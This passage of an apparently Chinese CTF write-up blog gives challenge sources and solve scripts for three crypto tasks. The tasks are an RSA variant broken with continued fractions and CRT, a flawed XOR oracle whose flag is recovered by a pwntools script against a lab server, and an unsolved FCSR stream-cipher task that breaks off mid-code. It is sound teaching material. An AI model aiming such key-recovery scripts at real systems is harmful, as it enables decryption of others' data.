class="code"><pre><span class="line"><span class="attribute">import</span> gmpy<span class="number">2</span></span><br><span class="line"><span class="attribute">from</span> Crypto.Util.number import *</span><br><span class="line"><span class="attribute">from</span> flag import flag</span><br><span class="line"><span class="attribute">assert</span> flag.startswith(b<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line"><span class="attribute">assert</span> flag.endswith(b<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="attribute">message</span>=bytes_to_long(flag)</span><br><span class="line"><span class="attribute">def</span> keygen(nbit, dbit):</span><br><span class="line">    <span class="attribute">if</span> <span class="number">2</span>*dbit &lt; nbit:</span><br><span class="line">        <span class="attribute">while</span> True:</span><br><span class="line">            <span class="attribute">a1</span> = getRandomNBitInteger(dbit)</span><br><span class="line">            <span class="attribute">b1</span> = getRandomNBitInteger(nbit//<span class="number">2</span>-dbit)</span><br><span class="line"></span><br><span class="line">            <span class="attribute">n1</span> = a<span class="number">1</span>*b<span class="number">1</span>+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="attribute">if</span> isPrime(n<span class="number">1</span>):</span><br><span class="line">                <span class="attribute">break</span></span><br><span class="line">        <span class="attribute">while</span> True:</span><br><span class="line">            <span class="attribute">a2</span> = getRandomNBitInteger(dbit)</span><br><span class="line">            <span class="attribute">b2</span> = getRandomNBitInteger(nbit//<span class="number">2</span>-dbit)</span><br><span class="line"></span><br><span class="line">            <span class="attribute">n2</span>=a<span class="number">2</span>*b<span class="number">2</span>+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="attribute">n3</span>=a<span class="number">1</span>*b<span class="number">2</span>+<span class="number">1</span></span><br><span class="line">            <span class="attribute">if</span> isPrime(n<span class="number">2</span>) and isPrime(n<span class="number">3</span>):</span><br><span class="line">                <span class="attribute">break</span></span><br><span class="line">        <span class="attribute">while</span> True:</span><br><span class="line">            <span class="attribute">a3</span>=getRandomNBitInteger(dbit)</span><br><span class="line">            <span class="attribute">if</span> gmpy<span class="number">2</span>.gcd(a<span class="number">3</span>,a<span class="number">1</span>*b<span class="number">1</span>*a<span class="number">2</span>*b<span class="number">2</span>)==<span class="number">1</span>:</span><br><span class="line">                <span class="attribute">v1</span>=(n<span class="number">1</span>-<span class="number">1</span>)*(n<span class="number">2</span>-<span class="number">1</span>) # phi<span class="number">1</span></span><br><span class="line">                <span class="attribute">k</span>=(a<span class="number">3</span>*inverse(a<span class="number">3</span>,v<span class="number">1</span>)-<span class="number">1</span>)//v<span class="number">1</span>  # k * phi<span class="number">1</span>=k * v<span class="number">1</span> = ed-<span class="number">1</span></span><br><span class="line">                <span class="attribute">v2</span>=k*b<span class="number">1</span>+<span class="number">1</span></span><br><span class="line">                <span class="attribute">if</span> isPrime(v<span class="number">2</span>):</span><br><span class="line">                    <span class="attribute">return</span> a<span class="number">3</span>,n<span class="number">1</span>*n<span class="number">2</span>,n<span class="number">3</span>*v<span class="number">2</span></span><br><span class="line"><span class="attribute">def</span> encrypt(msg, pubkey):</span><br><span class="line">    <span class="attribute">return</span> pow(msg, pubkey[<span class="number">0</span>], pubkey[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="attribute">nbit</span> = <span class="number">1024</span></span><br><span class="line"><span class="attribute">dbit</span> = <span class="number">256</span></span><br><span class="line"><span class="attribute">e</span>, n<span class="number">1</span>, n<span class="number">2</span>=keygen(nbit, dbit)</span><br><span class="line"><span class="attribute">print</span>(&#x27;e =&#x27;, e)</span><br><span class="line"><span class="attribute">print</span>(&#x27;n<span class="number">1</span> =&#x27;, n<span class="number">1</span>)</span><br><span class="line"><span class="attribute">print</span>(&#x27;n<span class="number">2</span> =&#x27;, n<span class="number">2</span>)</span><br><span class="line"><span class="attribute">c1</span> = encrypt(message,<span class="meta"> [e, n1])</span></span><br><span class="line"><span class="meta">c2 = encrypt(message, [e, n2])</span></span><br><span class="line"><span class="meta">print(&#x27;enc1 =&#x27;, c1)</span></span><br><span class="line"><span class="meta">print(&#x27;enc2 =&#x27;, c2)</span></span><br><span class="line"><span class="meta"># e = 86905291018330218127760596324522274547253465551209634052618098249596388694529</span></span><br><span class="line"><span class="meta"># n1 = 112187114035595515717020336420063560192608507634951355884730277020103272516595827630685773552014888608894587055283796519554267693654102295681730016199369580577243573496236556117934113361938190726830349853086562389955289707685145472794173966128519654167325961312446648312096211985486925702789773780669802574893</span></span><br><span class="line"><span class="meta"># n2 = 95727255683184071257205119413595957528984743590073248708202176413951084648626277198841459757379712896901385049813671642628441940941434989886894512089336243796745883128585743868974053010151180059532129088434348142499209024860189145032192068409977856355513219728891104598071910465809354419035148873624856313067</span></span><br><span class="line"><span class="meta"># enc1 = 71281698683006229705169274763783817580572445422844810406739630520060179171191882439102256990860101502686218994669784245358102850927955191225903171777969259480990566718683951421349181856119965365618782630111357309280954558872160237158905739584091706635219142133906953305905313538806862536551652537126291478865</span></span><br><span class="line"><span class="meta"># enc2 = 7333744583943012697651917897083326988621572932105018877567461023651527927346658805965099102481100945100738540533077677296823678241143375320240933128613487693799458418017975152399878829426141218077564669468040331339428477336144493624090728897185260894290517440392720900787100373142671471448913212103518035775</span></span><br></pre></td></tr></table></figure><h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p>$n_1 = a_1b_1+1,n_2=a_2b_2+1, n_3 = a_1b_2+1,v_2=kb_1+1$,且都为素数</p><p>$\phi _{n{_1}} = (n_1-1)(n_2-1) = a_1a_2b_1b_2=v_1$ </p><p>$\phi _{n{_2}} = (n_3-1)(v_2-1) = a_1b_2kb_1$</p><p>由<code>k=(a3*inverse(a3,v1)-1)//v1</code> 、<code>e=a3</code>知：</p><p>$k = \frac{e •  dinv(e, \phi_{n_1}) -1}{phi} = \frac{ed-1}{\phi_{n_1}} = \frac{k •  \phi_{n_1}}{ \phi_{n_1}} = k$</p><p>解题思路也是明确的，知道e了，只要知道一个phi就可以求出对应私钥d，便可求解明文m</p><p>试了许多方式，题目说数学很重要，以为是n1间n2相乘后有什么关系，但形式越发复杂，无果</p><p>加减乘都无效后，尝试除，起初也没看到直接的破题点</p><p>后看着题目math1，猛然想起除法所对应连分数，试着分析了下</p><p>$\frac{N2}{N1}=\frac{(a_1b_2+1)(kb_1+1)}{(a_1b_1+1)(a_2b_2+1)}≈\frac{a_1b_2kb_1}{a_1b_1a_2b_2}=\frac{k}{a_2}$</p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220619094607727.png" alt="image-20220619094607727"></p><p>再根据Legendre理论，$\frac{k}{a_2}$为$\frac{N2}{N1}$连分数</p><p>便可求出一系列的k、a2可能值</p><p>又有 $ed-1=k \phi_{n_1}$,所以：</p><p>$$\phi_{n_1} ≡ (-1)*k^{-1} \mod e$$</p><p>以及</p><p>$$\phi_{n_1} ≡ a_1a_2b_1b_2  = 0 \mod a_2$$</p><p>利用中国剩余定理联立之，得到$\phi_{n_1} \mod ea_2$</p><p>最后，为进一步确定确定$\phi_{n_1}$值，利用：$|𝜙−N1|=|(n_1−1)(n_2−1)−n_1n_2|=|-n_1−n_2+1|≈n_1+n_2 ≤ 2^{513}$</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> gmpy<span class="number">2</span></span><br><span class="line"><span class="attribute">import</span> libnum</span><br><span class="line"><span class="attribute">from</span> tqdm import tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">N1</span> = <span class="number">112187114035595515717020336420063560192608507634951355884730277020103272516595827630685773552014888608894587055283796519554267693654102295681730016199369580577243573496236556117934113361938190726830349853086562389955289707685145472794173966128519654167325961312446648312096211985486925702789773780669802574893</span></span><br><span class="line"><span class="attribute">N2</span> = <span class="number">95727255683184071257205119413595957528984743590073248708202176413951084648626277198841459757379712896901385049813671642628441940941434989886894512089336243796745883128585743868974053010151180059532129088434348142499209024860189145032192068409977856355513219728891104598071910465809354419035148873624856313067</span></span><br><span class="line"><span class="attribute">e</span> = <span class="number">86905291018330218127760596324522274547253465551209634052618098249596388694529</span></span><br><span class="line"><span class="attribute">enc1</span> = <span class="number">71281698683006229705169274763783817580572445422844810406739630520060179171191882439102256990860101502686218994669784245358102850927955191225903171777969259480990566718683951421349181856119965365618782630111357309280954558872160237158905739584091706635219142133906953305905313538806862536551652537126291478865</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = continued_fraction(int(N2) / int(N1)) </span></span><br><span class="line"><span class="comment"># sage里int不太对</span></span><br><span class="line"><span class="attribute">c</span> = continued_fraction(Integer(N<span class="number">2</span>) / Integer(N<span class="number">1</span>))</span><br><span class="line"><span class="attribute">for</span> i in tqdm(range(<span class="number">1</span>, <span class="number">163</span>)):</span><br><span class="line">    <span class="attribute">a2</span> = c.denominator(i)</span><br><span class="line">    <span class="attribute">k</span> = c.numerator(i)</span><br><span class="line">    <span class="attribute">if</span> gmpy<span class="number">2</span>.gcd(k, e) != <span class="number">1</span>:</span><br><span class="line">        <span class="attribute">continue</span></span><br><span class="line">    <span class="attribute">tmp</span> = gmpy<span class="number">2</span>.invert(k, e)</span><br><span class="line">    <span class="attribute">res</span> = (-<span class="number">1</span>*tmp) % e</span><br><span class="line">    <span class="attribute">phi_</span> = crt(res, <span class="number">0</span>, e, a<span class="number">2</span>)</span><br><span class="line">    <span class="attribute">bound</span> = e * a<span class="number">2</span> // gmpy<span class="number">2</span>.gcd(e, a<span class="number">2</span>)  # lcm</span><br><span class="line"></span><br><span class="line">    <span class="attribute">phi1</span> = phi_ + (N<span class="number">1</span> // bound) * bound - <span class="number">3</span> * bound  # phi<span class="number">1</span></span><br><span class="line">    <span class="attribute">d1</span> = gmpy<span class="number">2</span>.invert(e, phi<span class="number">1</span>)</span><br><span class="line">    <span class="attribute">flag</span> = libnum.n<span class="number">2</span>s(int(pow(enc<span class="number">1</span>, d<span class="number">1</span>, N<span class="number">1</span>)))</span><br><span class="line">    <span class="attribute">if</span> b<span class="string">&quot;flag&quot;</span> in flag:</span><br><span class="line">        <span class="attribute">print</span>(flag)</span><br></pre></td></tr></table></figure><p>总而言之 我们用中国剩余定理得到了$\phi(n_1)$，而他不是真正的$\phi(n_1)$，，可以理解为真正的$phi(n_1) \mod e*a2$的余数</p><p>我们需要扩大它 即：$\phi(n_1) = crt结果+k•e•a2$</p><p>但$e•a2$才512bit ，简单估计一下，$\phi(n_1)$与n1相近，应该是1024bit左右</p><p>如果直接从crt结果开始 从k=1开始遍历 太慢了！</p><p>需要适当的「放缩」来选择合适的范围来遍历,以加速，$\phi(n_1)$与N1相近, 就本能的往N1上靠近</p><p>于是有  <code>phi1 = phi_ + (N1 // bound) * bound</code></p><p>但显然 phi1的初始值（还没开始遍历k扩大） 是有可能大于N1的,就得缩小</p><p>这里可以大致估计的 按照期望  a1b1 、a2b2、ea2大小应该差不多,差了 a1b1 + a2b2 差不多就差了$2•e•a2$即$2•bound$</p><p>但前面加了 phi_ 保险起见应该再减多一个$e•a2$，经调试，的确如此<br><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220707213016894.png" alt="image-20220707213016894"></p><h3 id="Rand0m3（200）"><a href="#Rand0m3（200）" class="headerlink" title="Rand0m3（200）"></a>Rand0m3（200）</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># Rand0m3</span></span><br><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_print</span>(<span class="params">content, end = <span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> end != <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(content, end = end)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(content)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_flag</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        res = f.read()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_prompt</span>():</span></span><br><span class="line">    _<span class="built_in">print</span>(<span class="string">&quot;1. encrypt input&quot;</span>)</span><br><span class="line">    _<span class="built_in">print</span>(<span class="string">&quot;2. decrypt input&quot;</span>)</span><br><span class="line">    _<span class="built_in">print</span>(<span class="string">&quot;3. encrypt flag&quot;</span>)</span><br><span class="line">    _<span class="built_in">print</span>(<span class="string">&quot;4. exit&quot;</span>)</span><br><span class="line">    _<span class="built_in">print</span>(<span class="string">&quot;&gt;&gt; &quot;</span>, end = <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_int</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(read_string())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_string</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">input</span>().strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_u8</span>():</span> </span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;&lt;B&quot;</span>, os.urandom(<span class="number">1</span>))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">s, k</span>):</span></span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> k &lt;= <span class="built_in">len</span>(s):</span><br><span class="line">        _<span class="built_in">print</span>(<span class="string">&quot;[!] key shold be larger then len(pt) for safty!!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(s):</span><br><span class="line">        enc = (get_random_u8() + k * i) % <span class="number">0xff</span></span><br><span class="line">        enc = <span class="built_in">ord</span>(c) ^ enc</span><br><span class="line">        res += <span class="built_in">hex</span>(enc)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">s, k</span>):</span></span><br><span class="line">    _<span class="built_in">print</span>(<span class="string">&quot;[*] Give me the paper about predicting urandoGive me the paper about predicting urandomm&quot;</span>)</span><br><span class="line">    _<span class="built_in">print</span>(<span class="string">&quot;[*] ...Then i&#x27;ll decrypt your input ;)&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = read_flag()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print_prompt()</span><br><span class="line">        c = read_int()</span><br><span class="line">        <span class="keyword">if</span> c == <span class="number">1</span>:</span><br><span class="line">            _<span class="built_in">print</span>(<span class="string">&quot;key &gt;&gt; &quot;</span>, end = <span class="string">&quot;&quot;</span>)</span><br><span class="line">            key = read_int()</span><br><span class="line">            _<span class="built_in">print</span>(<span class="string">&quot;pt &gt;&gt; &quot;</span>, end = <span class="string">&quot;&quot;</span>)</span><br><span class="line">            pt = read_string()</span><br><span class="line">            _<span class="built_in">print</span>(<span class="string">&quot;result : %s&quot;</span>%encrypt(pt, key))</span><br><span class="line">        <span class="keyword">elif</span> c == <span class="number">2</span>:</span><br><span class="line">            _<span class="built_in">print</span>(<span class="string">&quot;key &gt;&gt; &quot;</span>, end = <span class="string">&quot;&quot;</span>)</span><br><span class="line">            key = read_int()</span><br><span class="line">            _<span class="built_in">print</span>(<span class="string">&quot;ct &gt;&gt; &quot;</span>, end = <span class="string">&quot;&quot;</span>)</span><br><span class="line">            ct = read_string()</span><br><span class="line">            _<span class="built_in">print</span>(<span class="string">&quot;result : %s&quot;</span>%decrypt(ct, key))</span><br><span class="line">        <span class="keyword">elif</span> c == <span class="number">3</span>:</span><br><span class="line">            _<span class="built_in">print</span>(<span class="string">&quot;key &gt;&gt; &quot;</span>, end = <span class="string">&quot;&quot;</span>)</span><br><span class="line">            key = read_int()</span><br><span class="line">            _<span class="built_in">print</span>(<span class="string">&quot;result : %s&quot;</span>%encrypt(flag, key))</span><br><span class="line">        <span class="keyword">elif</span> c == <span class="number">4</span>:</span><br><span class="line">            _<span class="built_in">print</span>(<span class="string">&quot;bye!!&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            _<span class="built_in">print</span>(<span class="string">&quot;invalid option...&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h4><p>巧，上个月刷到原题了，当时没写出来</p><p>赛后跟着<a href="https://kangmyoungseok.github.io/study/study10/">wp</a>尝试复现了下，居然撞上了</p><p>察觉后，觉得略有不同，在交互上卡了好一会，最后发现确实是一致的</p><p>想清楚了，思路也清晰</p><p>首先，关注题目中的加密代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">s, k</span>):</span></span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> k &lt;= <span class="built_in">len</span>(s):</span><br><span class="line">        _<span class="built_in">print</span>(<span class="string">&quot;[!] key shold be larger then len(pt) for safty!!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(s):  <span class="comment"># i 为index位置， c为s[i]</span></span><br><span class="line">        enc = (get_random_u8() + k * i) % <span class="number">0xff</span>  <span class="comment"># 0到254</span></span><br><span class="line">        enc = <span class="built_in">ord</span>(c) ^ enc  <span class="comment"># 唯独不可能与异或0b11111111异或</span></span><br><span class="line">        res += <span class="built_in">hex</span>(enc)[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&quot;0&quot;</span>)  <span class="comment"># 补齐两位</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>破题点在于<code>% 0xff</code>，这样导致第一步的enc范围固定下来，只能是0到254</p><p>其后，<code>enc = ord(c) ^ enc</code>，那么ord(c)就不可能与0b11111111（255）异或</p><p>所以为确定一位flag字符，只要进行多次encrypt，在0到255中排除到只剩1个数，那么它就是flag[i]^255(key不妨就设为255)的结果</p><p>那么，都确定好后，根据异或可逆性质再异或回来即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;172.16.30.220&#x27;</span>, <span class="number">58005</span>)  <span class="comment"># 记得改ip 端口</span></span><br><span class="line">key = <span class="number">255</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)  <span class="comment"># 模式3</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;key &gt;&gt; &#x27;</span>, <span class="string">&#x27;255&#x27;</span>)  <span class="comment"># 输入key值</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;result : &#x27;</span>)  <span class="comment"># 准备接受enc(flag, key)</span></span><br><span class="line"></span><br><span class="line">enc_flag = p.recvline()</span><br><span class="line">flag_len = <span class="built_in">len</span>(enc_flag) // <span class="number">2</span></span><br><span class="line">flag_set = [<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(flag_len)]  <span class="comment"># 存放每一位可能的flag_enc</span></span><br><span class="line">flag = [<span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(flag_len)]  <span class="comment"># flag初始化为一串0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;key &gt;&gt; &#x27;</span>, <span class="string">&#x27;255&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;result : &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    enc_flag = <span class="built_in">bytes</span>.fromhex(p.recvline()[:-<span class="number">1</span>].decode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_len):</span><br><span class="line">        <span class="keyword">if</span> flag_set[i].count(enc_flag[i]) == <span class="number">1</span>:</span><br><span class="line">            flag_set[i].remove(enc_flag[i])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(flag_set[i]) == <span class="number">1</span>:</span><br><span class="line">            flag[i] = <span class="built_in">chr</span>(flag_set[i][-<span class="number">1</span>] ^ key)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> flag_set])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span> flag:  <span class="comment"># 校验完毕</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br></pre></td></tr></table></figure><h3 id="fcsr-（未解）"><a href="#fcsr-（未解）" class="headerlink" title="fcsr （未解）"></a>fcsr （未解）</h3><ul><li><p>task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line">bits = <span class="number">80</span></span><br><span class="line">mask = <span class="number">2</span> ** bits - <span class="number">1</span></span><br><span class="line">feedback = <span class="number">0xae985dff26619fc58623dc8aaf46d5903dd4254e</span> <span class="comment"># ？？？</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key, iv</span>):</span></span><br><span class="line">        self.key = key</span><br><span class="line">        self.iv = iv</span><br><span class="line">        self.<span class="built_in">filter</span> = feedback</span><br><span class="line">        self.state = (self.iv &lt;&lt; bits) | self.key  <span class="comment"># 或运算</span></span><br><span class="line">        self.C = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        S = [<span class="number">0</span>] * <span class="number">20</span>  <span class="comment"># [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            self.clock()</span><br><span class="line">            S[i] = self.F()</span><br><span class="line"></span><br><span class="line">        self.state = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            shift = i * <span class="number">8</span></span><br><span class="line">            self.state |= (S[i] &lt;&lt; shift)</span><br><span class="line"></span><br><span class="line">        self.C = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">162</span>):</span><br><span class="line">            self.clock()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clock</span>(<span class="params">self</span>):</span></span><br><span class="line">        tmp = self.state &amp; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> tmp:</span><br><span class="line">            fb = feedback</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fb = <span class="number">0</span></span><br><span class="line">        self.state = self.state &gt;&gt; <span 